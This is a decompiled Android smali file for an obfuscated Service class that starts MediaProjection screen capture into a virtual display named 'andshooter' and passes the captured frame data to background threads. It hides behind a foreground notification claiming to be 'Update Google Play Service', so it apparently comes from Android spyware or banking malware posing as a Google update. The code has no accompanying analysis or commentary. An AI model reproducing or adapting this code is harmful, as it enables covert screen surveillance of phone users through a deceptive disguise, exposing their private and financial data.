.class public Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;
.super Landroid/app/Service;


# instance fields
.field a:Landroid/content/Intent;

.field b:Lwocwvy/czyxoxmbauu/slsa/b;

.field private c:Landroid/media/projection/MediaProjection;

.field private d:Landroid/hardware/display/VirtualDisplay;

.field private final e:Landroid/os/HandlerThread;

.field private f:Landroid/os/Handler;

.field private g:Landroid/media/projection/MediaProjectionManager;

.field private h:Landroid/view/WindowManager;

.field private i:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;

.field private j:I

.field private k:Landroid/content/Intent;

.field private l:Landroid/content/Context;

.field private m:Landroid/app/Notification;


# direct methods
.method public constructor <init>()V
    .locals 3

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Landroid/os/HandlerThread;

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0xa

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->e:Landroid/os/HandlerThread;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method

.method static synthetic a(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;)V
    .locals 0

    invoke-direct {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->c()V

    return-void
.end method

.method static synthetic b(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;)Landroid/hardware/display/VirtualDisplay;
    .locals 0

    iget-object p0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->d:Landroid/hardware/display/VirtualDisplay;

    return-object p0
.end method

.method private c()V
    .locals 10
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    :try_start_0
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->g:Landroid/media/projection/MediaProjectionManager;

    iget v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->j:I

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->k:Landroid/content/Intent;

    invoke-virtual {v0, v1, v2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->c:Landroid/media/projection/MediaProjection;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;

    invoke-direct {v0, p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;-><init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;)V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->i:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql$3;

    invoke-direct {v0, p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql$3;-><init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->c:Landroid/media/projection/MediaProjection;

    const-string v2, "andshooter"

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->i:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;

    invoke-virtual {v3}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->b()I

    move-result v3

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->i:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;

    invoke-virtual {v4}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->c()I

    move-result v4

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->getResources()Landroid/content/res/Resources;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v5

    iget v5, v5, Landroid/util/DisplayMetrics;->densityDpi:I

    const/16 v6, 0x9

    iget-object v7, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->i:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;

    invoke-virtual {v7}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/a;->a()Landroid/view/Surface;

    move-result-object v7

    const/4 v8, 0x0

    iget-object v9, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->f:Landroid/os/Handler;

    invoke-virtual/range {v1 .. v9}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v1

    iput-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->d:Landroid/hardware/display/VirtualDisplay;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->c:Landroid/media/projection/MediaProjection;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->f:Landroid/os/Handler;

    invoke-virtual {v1, v0, v2}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "error"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method private d()V
    .locals 2
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    new-instance v0, Landroid/app/Notification$Builder;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->l:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, "Info"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v1, "Update Google Play"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->m:Landroid/app/Notification;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->m:Landroid/app/Notification;

    const/16 v1, 0x26b2

    invoke-virtual {p0, v1, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method


# virtual methods
.method a()Landroid/view/WindowManager;
    .locals 1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->h:Landroid/view/WindowManager;

    return-object v0
.end method

.method a([B)V
    .locals 1

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql$2;

    invoke-direct {v0, p0, p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql$2;-><init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;[B)V

    invoke-virtual {v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql$2;->start()V

    return-void
.end method

.method b()Landroid/os/Handler;
    .locals 1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->f:Landroid/os/Handler;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, ""

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 2
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    iput-object p0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->l:Landroid/content/Context;

    const-string v0, "media_projection"

    invoke-virtual {p0, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->g:Landroid/media/projection/MediaProjectionManager;

    const-string v0, "window"

    invoke-virtual {p0, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->h:Landroid/view/WindowManager;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->e:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->e:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->f:Landroid/os/Handler;

    return-void
.end method

.method public onDestroy()V
    .locals 0
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    iput-object p0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->l:Landroid/content/Context;

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->a:Landroid/content/Intent;

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_1

    const-string p2, "resultCode"

    const/16 p3, 0x539

    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    iput p2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->j:I

    const-string p2, "resultIntent"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p1

    check-cast p1, Landroid/content/Intent;

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->k:Landroid/content/Intent;

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 p2, 0x1a

    if-lt p1, p2, :cond_0

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string p1, "Google"

    const-string p2, "Update Google Play Service"

    invoke-static {p0, p1, p2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/app/Service;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    invoke-direct {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;->d()V

    :goto_0
    new-instance p1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql$1;

    invoke-direct {p1, p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql$1;-><init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;)V

    invoke-virtual {p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql$1;->start()V

    :cond_1
    const/4 p1, 0x2

    return p1
.end method
